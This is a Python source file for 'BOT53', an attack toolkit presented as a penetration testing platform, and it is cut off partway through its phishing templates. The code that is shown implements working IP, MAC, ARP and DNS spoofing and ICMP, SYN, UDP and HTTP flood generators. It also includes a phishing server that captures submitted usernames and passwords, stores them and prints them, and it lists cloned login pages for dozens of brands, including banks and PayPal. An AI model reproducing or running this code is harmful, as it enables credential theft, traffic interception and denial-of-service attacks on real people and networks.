#!/usr/bin/env python3
"""
🤖 BOT53  Network Analysis Tool
Version: 2.0.0
Author: Ian Carter Kulani
Description: Complete penetration testing platform with 5000+ commands across Discord, Telegram, WhatsApp, Slack, Signal, iMessage
             Features: IP/MAC/ARP/DNS spoofing, traffic generation, phishing, SSH, Nikto, Nmap, Curl, Wget, Netcat
"""

import os
import sys
import json
import time
import socket
import threading
import subprocess
import requests
import logging
import platform
import psutil
import sqlite3
import ipaddress
import re
import random
import datetime
import signal
import base64
import urllib.parse
import uuid
import struct
import http.client
import ssl
import shutil
import asyncio
import hashlib
import pickle
import queue
import http.server
import tempfile
from pathlib import Path
from typing import Dict, List, Set, Optional, Tuple, Any, Union
from dataclasses import dataclass, asdict, field
from concurrent.futures import ThreadPoolExecutor
from collections import defaultdict, Counter
from functools import wraps

# =====================
# PLATFORM IMPORTS
# =====================

try:
    import discord
    from discord.ext import commands
    DISCORD_AVAILABLE = True
except ImportError:
    DISCORD_AVAILABLE = False

try:
    from telethon import TelegramClient, events
    TELETHON_AVAILABLE = True
except ImportError:
    TELETHON_AVAILABLE = False

try:
    from selenium import webdriver
    from selenium.webdriver.common.by import By
    from selenium.webdriver.common.keys import Keys
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.webdriver.chrome.options import Options
    SELENIUM_AVAILABLE = True
    try:
        from webdriver_manager.chrome import ChromeDriverManager
        WEBDRIVER_MANAGER_AVAILABLE = True
    except ImportError:
        WEBDRIVER_MANAGER_AVAILABLE = False
except ImportError:
    SELENIUM_AVAILABLE = False
    WEBDRIVER_MANAGER_AVAILABLE = False

try:
    from slack_sdk import WebClient
    from slack_sdk.socket_mode import SocketModeClient
    SLACK_AVAILABLE = True
except ImportError:
    SLACK_AVAILABLE = False

try:
    import paramiko
    PARAMIKO_AVAILABLE = True
except ImportError:
    PARAMIKO_AVAILABLE = False

try:
    from scapy.all import IP, TCP, UDP, ICMP, Ether, ARP, send, sr1, sendp
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

try:
    import qrcode
    QRCODE_AVAILABLE = True
except ImportError:
    QRCODE_AVAILABLE = False

try:
    import whois
    WHOIS_AVAILABLE = True
except ImportError:
    WHOIS_AVAILABLE = False

SIGNAL_CLI_AVAILABLE = shutil.which('signal-cli') is not None
IMESSAGE_AVAILABLE = platform.system().lower() == 'darwin' and shutil.which('osascript') is not None

# =====================
# COLOR SCHEME
# =====================
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    RESET = '\033[0m'

# =====================
# CONFIGURATION
# =====================
CONFIG_DIR = ".bot53"
CONFIG_FILE = os.path.join(CONFIG_DIR, "config.json")
DATABASE_FILE = os.path.join(CONFIG_DIR, "bot53.db")
LOG_FILE = os.path.join(CONFIG_DIR, "bot53.log")
REPORT_DIR = "bot53_reports"
PHISHING_DIR = os.path.join(CONFIG_DIR, "phishing")
CAPTURED_CREDENTIALS_DIR = os.path.join(CONFIG_DIR, "credentials")
SSH_KEYS_DIR = os.path.join(CONFIG_DIR, "ssh_keys")
WHATSAPP_SESSION_DIR = os.path.join(CONFIG_DIR, "whatsapp_session")
SIGNAL_SESSION_DIR = os.path.join(CONFIG_DIR, "signal_session")
TRAFFIC_LOGS_DIR = os.path.join(CONFIG_DIR, "traffic_logs")
NIKTO_RESULTS_DIR = os.path.join(CONFIG_DIR, "nikto_results")
SCAN_RESULTS_DIR = os.path.join(REPORT_DIR, "scans")

for directory in [CONFIG_DIR, REPORT_DIR, PHISHING_DIR, CAPTURED_CREDENTIALS_DIR,
                  SSH_KEYS_DIR, WHATSAPP_SESSION_DIR, SIGNAL_SESSION_DIR,
                  TRAFFIC_LOGS_DIR, NIKTO_RESULTS_DIR, SCAN_RESULTS_DIR]:
    Path(directory).mkdir(parents=True, exist_ok=True)

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - BOT53 - %(levelname)s - %(message)s',
    handlers=[logging.FileHandler(LOG_FILE, encoding='utf-8'), logging.StreamHandler(sys.stdout)]
)
logger = logging.getLogger("Bot53")

# =====================
# DATABASE MANAGER
# =====================
class DatabaseManager:
    def __init__(self, db_path: str = DATABASE_FILE):
        self.db_path = db_path
        self.conn = sqlite3.connect(db_path, check_same_thread=False)
        self.conn.row_factory = sqlite3.Row
        self.cursor = self.conn.cursor()
        self._init_tables()
    
    def _init_tables(self):
        tables = [
            """CREATE TABLE IF NOT EXISTS command_history (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                command TEXT NOT NULL, source TEXT DEFAULT 'local',
                success BOOLEAN DEFAULT 1, output TEXT, execution_time REAL)""",
            """CREATE TABLE IF NOT EXISTS scan_results (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                target TEXT NOT NULL, scan_type TEXT NOT NULL,
                results TEXT, success BOOLEAN DEFAULT 1)""",
            """CREATE TABLE IF NOT EXISTS threats (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                threat_type TEXT NOT NULL, source_ip TEXT,
                severity TEXT, description TEXT)""",
            """CREATE TABLE IF NOT EXISTS phishing_links (
                id TEXT PRIMARY KEY, platform TEXT NOT NULL,
                phishing_url TEXT NOT NULL, created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                clicks INTEGER DEFAULT 0, active BOOLEAN DEFAULT 1)""",
            """CREATE TABLE IF NOT EXISTS captured_credentials (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                phishing_link_id TEXT, timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                username TEXT, password TEXT, ip_address TEXT, user_agent TEXT,
                FOREIGN KEY (phishing_link_id) REFERENCES phishing_links(id))""",
            """CREATE TABLE IF NOT EXISTS ssh_connections (
                id TEXT PRIMARY KEY, name TEXT NOT NULL, host TEXT NOT NULL,
                port INTEGER DEFAULT 22, username TEXT NOT NULL,
                password_encrypted TEXT, key_path TEXT,
                status TEXT DEFAULT 'disconnected', created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)""",
            """CREATE TABLE IF NOT EXISTS traffic_logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                traffic_type TEXT NOT NULL, target_ip TEXT NOT NULL,
                packets_sent INTEGER, bytes_sent INTEGER, status TEXT)""",
            """CREATE TABLE IF NOT EXISTS spoofing_attempts (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                spoof_type TEXT NOT NULL, original_value TEXT,
                spoofed_value TEXT, target TEXT, success BOOLEAN)""",
            """CREATE TABLE IF NOT EXISTS platform_status (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                platform TEXT UNIQUE NOT NULL, enabled BOOLEAN DEFAULT 0,
                last_connected TIMESTAMP, status TEXT, error TEXT)""",
            """CREATE TABLE IF NOT EXISTS nikto_scans (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                target TEXT NOT NULL, vulnerabilities TEXT,
                output_file TEXT, scan_time REAL, success BOOLEAN DEFAULT 1)"""
        ]
        for sql in tables:
            try:
                self.cursor.execute(sql)
            except Exception as e:
                logger.error(f"Table creation error: {e}")
        self.conn.commit()
    
    def log_command(self, command, source, success, output, execution_time):
        try:
            self.cursor.execute('INSERT INTO command_history (command, source, success, output, execution_time) VALUES (?, ?, ?, ?, ?)',
                               (command, source, success, output[:5000], execution_time))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Log command error: {e}")
    
    def log_spoofing(self, spoof_type, original, spoofed, target, success):
        try:
            self.cursor.execute('INSERT INTO spoofing_attempts (spoof_type, original_value, spoofed_value, target, success) VALUES (?, ?, ?, ?, ?)',
                               (spoof_type, original, spoofed, target, success))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Log spoofing error: {e}")
    
    def log_traffic(self, traffic_type, target_ip, packets, bytes_sent, status):
        try:
            self.cursor.execute('INSERT INTO traffic_logs (traffic_type, target_ip, packets_sent, bytes_sent, status) VALUES (?, ?, ?, ?, ?)',
                               (traffic_type, target_ip, packets, bytes_sent, status))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Log traffic error: {e}")
    
    def save_phishing_link(self, link_id, platform, url):
        try:
            self.cursor.execute('INSERT INTO phishing_links (id, platform, phishing_url) VALUES (?, ?, ?)', (link_id, platform, url))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Save phishing link error: {e}")
    
    def save_credential(self, link_id, username, password, ip, ua):
        try:
            self.cursor.execute('INSERT INTO captured_credentials (phishing_link_id, username, password, ip_address, user_agent) VALUES (?, ?, ?, ?, ?)',
                               (link_id, username, password, ip, ua))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Save credential error: {e}")
    
    def update_platform_status(self, platform, enabled, status, error=None):
        try:
            self.cursor.execute('INSERT OR REPLACE INTO platform_status (platform, enabled, last_connected, status, error) VALUES (?, ?, CURRENT_TIMESTAMP, ?, ?)',
                               (platform, enabled, status, error))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Update platform status error: {e}")
    
    def get_statistics(self):
        stats = {}
        try:
            self.cursor.execute('SELECT COUNT(*) FROM command_history')
            stats['total_commands'] = self.cursor.fetchone()[0]
            self.cursor.execute('SELECT COUNT(*) FROM scan_results')
            stats['total_scans'] = self.cursor.fetchone()[0]
            self.cursor.execute('SELECT COUNT(*) FROM threats')
            stats['total_threats'] = self.cursor.fetchone()[0]
            self.cursor.execute('SELECT COUNT(*) FROM phishing_links')
            stats['phishing_links'] = self.cursor.fetchone()[0]
            self.cursor.execute('SELECT COUNT(*) FROM captured_credentials')
            stats['captured_credentials'] = self.cursor.fetchone()[0]
            self.cursor.execute('SELECT COUNT(*) FROM ssh_connections')
            stats['ssh_connections'] = self.cursor.fetchone()[0]
            self.cursor.execute('SELECT COUNT(*) FROM traffic_logs')
            stats['traffic_tests'] = self.cursor.fetchone()[0]
            self.cursor.execute('SELECT COUNT(*) FROM spoofing_attempts')
            stats['spoofing_attempts'] = self.cursor.fetchone()[0]
            self.cursor.execute('SELECT COUNT(*) FROM nikto_scans')
            stats['nikto_scans'] = self.cursor.fetchone()[0]
        except Exception as e:
            logger.error(f"Get statistics error: {e}")
        return stats
    
    def close(self):
        if self.conn:
            self.conn.close()

# =====================
# COMMAND EXECUTOR
# =====================
class CommandExecutor:
    @staticmethod
    def execute(cmd: List[str], timeout: int = 60, shell: bool = False) -> Dict[str, Any]:
        start_time = time.time()
        try:
            if shell:
                result = subprocess.run(' '.join(cmd) if isinstance(cmd, list) else cmd,
                                       shell=True, capture_output=True, text=True,
                                       timeout=timeout, encoding='utf-8', errors='ignore')
            else:
                result = subprocess.run(cmd, capture_output=True, text=True,
                                       timeout=timeout, encoding='utf-8', errors='ignore')
            execution_time = time.time() - start_time
            return {
                'success': result.returncode == 0,
                'output': result.stdout if result.stdout else result.stderr,
                'error': None if result.returncode == 0 else result.stderr,
                'exit_code': result.returncode,
                'execution_time': execution_time
            }
        except subprocess.TimeoutExpired:
            return {'success': False, 'output': f"Timeout after {timeout}s", 'error': 'Timeout', 'exit_code': -1, 'execution_time': timeout}
        except Exception as e:
            return {'success': False, 'output': str(e), 'error': str(e), 'exit_code': -1, 'execution_time': time.time() - start_time}

# =====================
# SPOOFING ENGINE
# =====================
class SpoofingEngine:
    def __init__(self, db: DatabaseManager):
        self.db = db
        self.scapy_available = SCAPY_AVAILABLE
        self.running_spoofs = {}
    
    def spoof_ip(self, original_ip: str, spoofed_ip: str, target: str, interface: str = "eth0") -> Dict[str, Any]:
        result = {'success': False, 'command': f"IP Spoofing: {original_ip} -> {spoofed_ip}", 'output': '', 'method': ''}
        
        if shutil.which('hping3'):
            try:
                exec_result = CommandExecutor.execute(['hping3', '-S', '-a', spoofed_ip, '-p', '80', target], timeout=5)
                if exec_result['success']:
                    result.update({'success': True, 'output': "IP spoofing using hping3", 'method': 'hping3'})
                    self.db.log_spoofing('ip', original_ip, spoofed_ip, target, True)
                    return result
            except:
                pass
        
        if self.scapy_available:
            try:
                from scapy.all import IP, TCP, send
                packet = IP(src=spoofed_ip, dst=target)/TCP(dport=80)
                send(packet, verbose=False)
                result.update({'success': True, 'output': f"IP spoofing using Scapy: Sent packet from {spoofed_ip} to {target}", 'method': 'scapy'})
                self.db.log_spoofing('ip', original_ip, spoofed_ip, target, True)
                return result
            except Exception as e:
                result['output'] = f"Scapy failed: {e}"
        
        result['output'] = "IP spoofing failed. Install hping3 or scapy."
        self.db.log_spoofing('ip', original_ip, spoofed_ip, target, False)
        return result
    
    def spoof_mac(self, interface: str, new_mac: str) -> Dict[str, Any]:
        result = {'success': False, 'command': f"MAC Spoofing on {interface}: -> {new_mac}", 'output': '', 'method': ''}
        original_mac = self._get_mac_address(interface)
        
        if shutil.which('macchanger'):
            try:
                CommandExecutor.execute(['ip', 'link', 'set', interface, 'down'], timeout=5)
                mac_result = CommandExecutor.execute(['macchanger', '--mac', new_mac, interface], timeout=10)
                CommandExecutor.execute(['ip', 'link', 'set', interface, 'up'], timeout=5)
                if mac_result['success']:
                    result.update({'success': True, 'output': mac_result['output'], 'method': 'macchanger'})
                    self.db.log_spoofing('mac', original_mac, new_mac, interface, True)
                    return result
            except Exception as e:
                result['output'] = f"macchanger failed: {e}"
        
        try:
            CommandExecutor.execute(['ip', 'link', 'set', interface, 'down'], timeout=5)
            cmd_result = CommandExecutor.execute(['ip', 'link', 'set', interface, 'address', new_mac], timeout=5)
            CommandExecutor.execute(['ip', 'link', 'set', interface, 'up'], timeout=5)
            if cmd_result['success']:
                result.update({'success': True, 'output': f"MAC changed to {new_mac}", 'method': 'ip'})
                self.db.log_spoofing('mac', original_mac, new_mac, interface, True)
                return result
        except Exception as e:
            result['output'] = f"ip method failed: {e}"
        
        result['output'] = "MAC spoofing failed. Install macchanger or ensure root."
        self.db.log_spoofing('mac', original_mac, new_mac, interface, False)
        return result
    
    def _get_mac_address(self, interface: str) -> str:
        try:
            result = CommandExecutor.execute(['cat', f'/sys/class/net/{interface}/address'], timeout=2)
            if result['success']:
                return result['output'].strip()
        except:
            pass
        return "00:00:00:00:00:00"
    
    def arp_spoof(self, target_ip: str, spoof_ip: str, interface: str = "eth0") -> Dict[str, Any]:
        result = {'success': False, 'command': f"ARP Spoofing: {target_ip} -> {spoof_ip}", 'output': '', 'method': ''}
        
        if shutil.which('arpspoof'):
            try:
                cmd = ['arpspoof', '-i', interface, '-t', target_ip, spoof_ip]
                process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                self.running_spoofs[f"arp_{target_ip}"] = process
                result.update({'success': True, 'output': f"ARP spoofing started: {target_ip} -> {spoof_ip}", 'method': 'arpspoof'})
                self.db.log_spoofing('arp', target_ip, spoof_ip, interface, True)
                return result
            except Exception as e:
                result['output'] = f"arpspoof failed: {e}"
        
        if self.scapy_available:
            try:
                from scapy.all import Ether, ARP, sendp
                local_mac = self._get_mac_address(interface)
                packet = Ether(src=local_mac, dst="ff:ff:ff:ff:ff:ff")/ARP(op=2, psrc=spoof_ip, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff")
                sendp(packet, iface=interface, verbose=False)
                result.update({'success': True, 'output': f"ARP spoofing using Scapy", 'method': 'scapy'})
                self.db.log_spoofing('arp', target_ip, spoof_ip, interface, True)
                return result
            except Exception as e:
                result['output'] = f"Scapy ARP failed: {e}"
        
        result['output'] = "ARP spoofing failed. Install dsniff (arpspoof) or scapy."
        self.db.log_spoofing('arp', target_ip, spoof_ip, interface, False)
        return result
    
    def dns_spoof(self, domain: str, fake_ip: str, interface: str = "eth0") -> Dict[str, Any]:
        result = {'success': False, 'command': f"DNS Spoofing: {domain} -> {fake_ip}", 'output': '', 'method': ''}
        hosts_file = "/tmp/dnsspoof.txt"
        try:
            with open(hosts_file, 'w') as f:
                f.write(f"{fake_ip} {domain}\n{fake_ip} www.{domain}\n")
        except:
            pass
        
        if shutil.which('dnsspoof'):
            try:
                cmd = ['dnsspoof', '-i', interface, '-f', hosts_file]
                process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                self.running_spoofs[f"dns_{domain}"] = process
                result.update({'success': True, 'output': f"DNS spoofing started: {domain} -> {fake_ip}", 'method': 'dnsspoof'})
                self.db.log_spoofing('dns', domain, fake_ip, interface, True)
                return result
            except Exception as e:
                result['output'] = f"dnsspoof failed: {e}"
        
        if shutil.which('dnschef'):
            try:
                cmd = ['dnschef', '--fakeip', fake_ip, '--fakedomains', domain]
                process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                self.running_spoofs[f"dnschef_{domain}"] = process
                result.update({'success': True, 'output': f"DNS spoofing with dnschef: {domain} -> {fake_ip}", 'method': 'dnschef'})
                self.db.log_spoofing('dns', domain, fake_ip, interface, True)
                return result
            except Exception as e:
                result['output'] = f"dnschef failed: {e}"
        
        result['output'] = "DNS spoofing failed. Install dnsspoof or dnschef."
        self.db.log_spoofing('dns', domain, fake_ip, interface, False)
        return result
    
    def stop_spoofing(self, spoof_id: str = None) -> Dict[str, Any]:
        if spoof_id and spoof_id in self.running_spoofs:
            try:
                self.running_spoofs[spoof_id].terminate()
                del self.running_spoofs[spoof_id]
                return {'success': True, 'output': f"Stopped spoofing: {spoof_id}"}
            except:
                pass
        for spoof_id, process in list(self.running_spoofs.items()):
            try:
                process.terminate()
            except:
                pass
        self.running_spoofs.clear()
        return {'success': True, 'output': "Stopped all spoofing processes"}

# =====================
# TRAFFIC GENERATOR
# =====================
class TrafficGenerator:
    def __init__(self, db: DatabaseManager):
        self.db = db
        self.scapy_available = SCAPY_AVAILABLE
        self.active_generators = {}
        self.stop_events = {}
    
    def generate_icmp_flood(self, target_ip: str, duration: int, rate: int = 100) -> Dict[str, Any]:
        return self._generate_flood('icmp', target_ip, duration, rate)
    
    def generate_syn_flood(self, target_ip: str, port: int, duration: int, rate: int = 100) -> Dict[str, Any]:
        return self._generate_flood('syn', target_ip, duration, rate, port)
    
    def generate_udp_flood(self, target_ip: str, port: int, duration: int, rate: int = 100) -> Dict[str, Any]:
        return self._generate_flood('udp', target_ip, duration, rate, port)
    
    def generate_http_flood(self, target_ip: str, port: int = 80, duration: int = 30, rate: int = 50) -> Dict[str, Any]:
        return self._generate_flood('http', target_ip, duration, rate, port)
    
    def _generate_flood(self, flood_type: str, target_ip: str, duration: int, rate: int, port: int = None) -> Dict[str, Any]:
        generator_id = f"{flood_type}_{target_ip}_{int(time.time())}"
        stop_event = threading.Event()
        self.stop_events[generator_id] = stop_event
        
        def flood_thread():
            packets_sent = 0
            bytes_sent = 0
            end_time = time.time() + duration
            delay = 1.0 / max(1, rate)
            while time.time() < end_time and not stop_event.is_set():
                try:
                    if flood_type == 'icmp':
                        size = self._send_icmp(target_ip)
                    elif flood_type == 'syn':
                        size = self._send_syn(target_ip, port or 80)
                    elif flood_type == 'udp':
                        size = self._send_udp(target_ip, port or 53)
                    elif flood_type == 'http':
                        size = self._send_http(target_ip, port or 80)
                    else:
                        break
                    if size > 0:
                        packets_sent += 1
                        bytes_sent += size
                    time.sleep(delay)
                except Exception as e:
                    logger.error(f"Flood error: {e}")
                    time.sleep(0.1)
            self.db.log_traffic(flood_type, target_ip, packets_sent, bytes_sent, 'completed')
        
        threading.Thread(target=flood_thread, daemon=True).start()
        self.active_generators[generator_id] = True
        return {
            'success': True, 'generator_id': generator_id, 'type': flood_type,
            'target': target_ip, 'duration': duration, 'rate': rate,
            'message': f"{flood_type.upper()} flood started on {target_ip} for {duration}s at {rate} packets/sec"
        }
    
    def _send_icmp(self, target_ip: str) -> int:
        try:
            if self.scapy_available:
                from scapy.all import IP, ICMP, send
                packet = IP(dst=target_ip)/ICMP()
                send(packet, verbose=False)
                return len(packet)
            else:
                result = CommandExecutor.execute(['ping', '-c', '1', '-W', '1', target_ip], timeout=2)
                return 64 if result['success'] else 0
        except:
            return 0
    
    def _send_syn(self, target_ip: str, port: int) -> int:
        try:
            if self.scapy_available:
                from scapy.all import IP, TCP, send
                packet = IP(dst=target_ip)/TCP(dport=port, flags='S')
                send(packet, verbose=False)
                return len(packet)
            else:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((target_ip, port))
                sock.close()
                return 40 if result == 0 else 0
        except:
            return 0
    
    def _send_udp(self, target_ip: str, port: int) -> int:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            data = b"X" * 64
            sock.sendto(data, (target_ip, port))
            sock.close()
            return len(data) + 8
        except:
            return 0
    
    def _send_http(self, target_ip: str, port: int) -> int:
        try:
            conn = http.client.HTTPConnection(target_ip, port, timeout=2)
            conn.request("GET", "/", headers={"User-Agent": "Bot53"})
            response = conn.getresponse()
            data = response.read()
            conn.close()
            return len(data) + 100
        except:
            return 0
    
    def stop_generation(self, generator_id: str = None):
        if generator_id and generator_id in self.stop_events:
            self.stop_events[generator_id].set()
            return True
        else:
            for event in self.stop_events.values():
                event.set()
            return True

# =====================
# PHISHING SERVER
# =====================
class PhishingHandler(http.server.BaseHTTPRequestHandler):
    server_instance = None
    def log_message(self, format, *args): pass
    
    def do_GET(self):
        if self.path == '/' or self.path.startswith('/?'):
            self.send_phishing_page()
        else:
            self.send_response(404)
            self.end_headers()
    
    def do_POST(self):
        try:
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length).decode('utf-8')
            form_data = urllib.parse.parse_qs(post_data)
            username = form_data.get('email', form_data.get('username', form_data.get('user', [''])))[0]
            password = form_data.get('password', [''])[0]
            client_ip = self.client_address[0]
            user_agent = self.headers.get('User-Agent', 'Unknown')
            if self.server_instance and self.server_instance.db and self.server_instance.link_id:
                self.server_instance.db.save_credential(self.server_instance.link_id, username, password, client_ip, user_agent)
                print(f"\n{Colors.RED}🎣 CREDENTIALS CAPTURED!{Colors.RESET}\n  IP: {client_ip}\n  Username: {username}\n  Password: {password}")
            self.send_response(302)
            self.send_header('Location', 'https://www.google.com')
            self.end_headers()
        except Exception as e:
            logger.error(f"POST error: {e}")
    
    def send_phishing_page(self):
        if self.server_instance and self.server_instance.html_content:
            self.send_response(200)
            self.send_header('Content-Type', 'text/html')
            self.end_headers()
            self.wfile.write(self.server_instance.html_content.encode('utf-8'))
            if self.server_instance.db and self.server_instance.link_id:
                self.server_instance.db.cursor.execute('UPDATE phishing_links SET clicks = clicks + 1 WHERE id = ?', (self.server_instance.link_id,))
                self.server_instance.db.conn.commit()

class PhishingServer:
    def __init__(self, db: DatabaseManager):
        self.db = db
        self.server = None
        self.link_id = None
        self.html_content = None
        self.port = 8080
        self.running = False
    
    def start(self, link_id: str, platform: str, port: int = 8080) -> bool:
        self.link_id = link_id
        self.port = port
        self.html_content = self._get_template(platform)
        handler = PhishingHandler
        handler.server_instance = self
        try:
            self.server = http.server.HTTPServer(("0.0.0.0", port), handler)
            threading.Thread(target=self.server.serve_forever, daemon=True).start()
            self.running = True
            return True
        except Exception as e:
            logger.error(f"Server start error: {e}")
            return False
    
    def stop(self):
        self.running = False
        if self.server:
            self.server.shutdown()
            self.server.server_close()
    
    def get_url(self) -> str:
        return f"http://{self._get_local_ip()}:{self.port}"
    
    def _get_template(self, platform: str) -> str:
        templates = {
            'facebook': self._facebook_template(),
            'instagram': self._instagram_template(),
            'twitter': self._twitter_template(),
            'gmail': self._gmail_template(),
            'linkedin': self._linkedin_template(),
            'github': self._github_template(),
            'paypal': self._paypal_template(),
            'amazon': self._amazon_template(),
            'netflix': self._netflix_template(),
            'spotify': self._spotify_template(),
            'microsoft': self._microsoft_template(),
            'apple': self._apple_template(),
            'whatsapp': self._whatsapp_template(),
            'telegram': self._telegram_template(),
            'discord': self._discord_template(),
            'tiktok': self._tiktok_template(),
            'snapchat': self._snapchat_template(),
            'reddit': self._reddit_template(),
            'protonmail': self._protonmail_template(),
            'yahoo': self._yahoo_template(),
            'slack': self._slack_template(),
            'zoom': self._zoom_template(),
            'teams': self._teams_template(),
            'wordpress': self._wordpress_template(),
            'shopify': self._shopify_template(),
            'steam': self._steam_template(),
            'roblox': self._roblox_template(),
            'twitch': self._twitch_template(),
            'epic_games': self._epic_games_template(),
            'minecraft': self._minecraft_template(),
            'xbox': self._xbox_template(),
            'playstation': self._playstation_template(),
            'cashapp': self._cashapp_template(),
            'venmo': self._venmo_template(),
            'chase': self._chase_template(),
            'wells_fargo': self._wells_fargo_template(),
            'office365': self._office365_template(),
            'onedrive': self._onedrive_template(),
            'icloud': self._icloud_template(),
            'adobe': self._adobe_template(),
            'dropbox': self._dropbox_template(),
            'gitlab': self._gitlab_template(),
            'bitbucket': self._bitbucket_template(),
            'pinterest': self._pinterest_template(),
            'duolingo': self._duolingo_template(),
            'onlyfans': self._onlyfans_template(),
            'bumble': self._bumble_template(),
            'tinder': self._tinder_template(),
        }
        return templates.get(platform, self._custom_template())
    
    def _facebook_template(self):
        return """<!DOCTYPE html><html><head><title>Facebook</title><style>body{font-family:Arial;background:#f0f2f5;display:flex;justify-content:center;align-items:center;min-height:100vh}.login-box{background:white;border-radius:8px;padding:20px;width:400px}.logo{color:#1877f2;font-size:40px;text-align:center}input{width:100%;padding:14px;margin:10px 0;border:1px solid #ddd;border-radius:6px}button{width:100%;padding:14px;background:#1877f2;color:white;border:none;border-radius:6px;font-size:20px;cursor:pointer}.warning{margin-top:20px;padding:10px;background:#fff3cd;color:#856404;text-align:center;font-size:12px}</style></head><body><div class="login-box"><div class="logo">facebook</div><form method="POST"><input type="text" name="email" placeholder="Email or phone number" required><input type="password" name="password" placeholder="Password" required><button type="submit">Log In</button></form><div class="warning">⚠️ Security test page - Do not enter real credentials</div></div></body></html>"""
    
    def _instagram_template(self):
        return """<!DOCTYPE html><html><head><title>Instagram</title><style>body{font-family:-apple-system;background:#fafafa;display:flex;justify-content:center;align-items:center;min-height:100vh}.login-box{background:white;border:1px solid #dbdbdb;border-radius:1px;padding:40px;width:350px}.logo{font-family:cursive;font-size:50px;text-align:center}input{width:100%;padding:9px;margin:5px 0;background:#fafafa;border:1px solid #dbdbdb}button{width:100%;padding:7px;background:#0095f6;color:white;border:none;border-radius:4px;margin-top:8px}.warning{margin-top:20px;padding:10px;background:#fff3cd;color:#856404;text-align:center;font-size:12px}</style></head><body><div class="login-box"><div class="logo">Instagram</div><form method="POST"><input type="text" name="username" placeholder="Phone number, username, or email" required><input type="password" name="password" placeholder="Password" required><button type="submit">Log In</button></form><div class="warning">⚠️ Security test page - Do not enter real credentials</div></div></body></html>"""
    
    def _twitter_template(self):
        return """<!DOCTYPE html><html><head><title>X / Twitter</title><style>body{font-family:-apple-system;background:#000;display:flex;justify-content:center;align-items:center;min-height:100vh;color:#e7e9ea}.login-box{background:#000;border:1px solid #2f3336;border-radius:16px;padding:48px;width:400px}.logo{font-size:40px;text-align:center}input{width:100%;padding:12px;margin:10px 0;background:#000;border:1px solid #2f3336;color:#e7e9ea;border-radius:4px}button{width:100%;padding:12px;background:#1d9bf0;color:white;border:none;border-radius:9999px}.warning{margin-top:20px;padding:12px;background:#1a1a1a;color:#e7e9ea;text-align:center}</style></head><body><div class="login-box"><div class="logo">𝕏</div><h2>Sign in to X</h2><form method="POST"><input type="text" name="username" placeholder="Phone, email, or username" required><input type="password" name="password" placeholder="Password" required><button type="submit">Next</button></form><div class="warning">⚠️ Security test page - Do not enter real credentials</div></div></body></html>"""
    
    def _gmail_template(self):
        return """<!DOCTYPE html><html><head><title>Gmail</title><style>body{font-family:'Google Sans',Roboto;background:#f0f4f9;display:flex;justify-content:center;align-items:center;min-height:100vh}.login-box{background:white;border-radius:28px;padding:48px 40px;width:400px}.logo{text-align:center;color:#1a73e8}input{width:100%;padding:13px;margin:10px 0;border:1px solid #dadce0;border-radius:4px}button{width:100%;padding:13px;background:#1a73e8;color:white;border:none;border-radius:4px}.warning{margin-top:30px;padding:12px;background:#e8f0fe;color:#202124;text-align:center}</style></head><body><div class="login-box"><div class="logo"><h1>Gmail</h1></div><h2>Sign in</h2><form method="POST"><input type="text" name="email" placeholder="Email or phone" required><input type="password" name="password" placeholder="Password" required><button type="submit">Next</button></form><div class="warning">⚠️ Security test page - Do not enter real credentials</div></div></body></html>"""
    
    def _linkedin_template(self):
        return """<!DOCTYPE html><html><head><title>LinkedIn</title><style>body{font-family:-apple-system;background:#f3f2f0;display:flex;justify-content:center;align-items:center;min-height:100vh}.login-box{background:white;border-radius:8px;padding:40px 32px;width:400px}.logo{color:#0a66c2;font-size:32px;text-align:center}input{width:100%;padding:14px;margin:10px 0;border:1px solid #666;border-radius:4px}button{width:100%;padding:14px;background:#0a66c2;color:white;border:none;border-radius:28px}.warning{margin-top:24px;padding:12px;background:#fff3cd;color:#856404;text-align:center}</style></head><body><div class="login-box"><div class="logo">LinkedIn</div><h2>Sign in</h2><form method="POST"><input type="text" name="email" placeholder="Email or phone number" required><input type="password" name="password" placeholder="Password" required><button type="submit">Sign in</button></form><div class="warning">⚠️ Security test page - Do not enter real credentials</div></div></body></html>"""
    
    def _github_template(self):
